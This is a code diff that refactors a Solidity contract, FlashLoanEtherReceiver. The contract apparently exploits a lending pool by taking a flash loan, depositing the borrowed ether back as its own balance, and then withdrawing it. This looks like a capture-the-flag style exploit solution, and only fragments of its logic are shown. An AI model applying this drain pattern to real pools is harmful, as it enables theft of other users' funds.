@@ -8,13 +8,10 @@ contract FlashLoanEtherReceiver {
   address constant POOL = 0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b;
 
   function init() public payable {
-    bytes4 flashLoan = 0x9ab603b9; //flashLoan(uint256)
-    bytes4 withdraw = 0x3ccfd60b; //withdraw()
-
     assembly {
       let calldataOffset := mload(0x40)
       mstore(0x40, add(calldataOffset, 0x44))
-      mstore(calldataOffset, flashLoan)
+      mstore(calldataOffset, hex"9ab603b9") //flashLoan(uint256)
       mstore(add(calldataOffset, 0x04), ETHER_IN_POOL)
 
       pop(
@@ -33,7 +30,7 @@ contract FlashLoanEtherReceiver {
     assembly {
       let calldataOffset := mload(0x40)
       mstore(0x40, add(calldataOffset, 0x44))
-      mstore(calldataOffset, withdraw)
+      mstore(calldataOffset, hex"3ccfd60b") //withdraw()
 
       pop(
         call(
@@ -50,11 +47,10 @@ contract FlashLoanEtherReceiver {
   }
 
   function execute() external payable {
-    bytes4 deposit = 0xd0e30db0; //deposit()
     assembly {
       let calldataOffset := mload(0x40)
       mstore(0x40, add(calldataOffset, 0x44))
-      mstore(calldataOffset, deposit)
+      mstore(calldataOffset, hex"d0e30db0") //deposit()
 
       pop(
         call(
